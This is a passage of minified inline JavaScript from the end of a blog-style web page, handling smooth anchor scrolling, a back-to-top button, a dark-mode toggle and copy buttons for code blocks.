reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>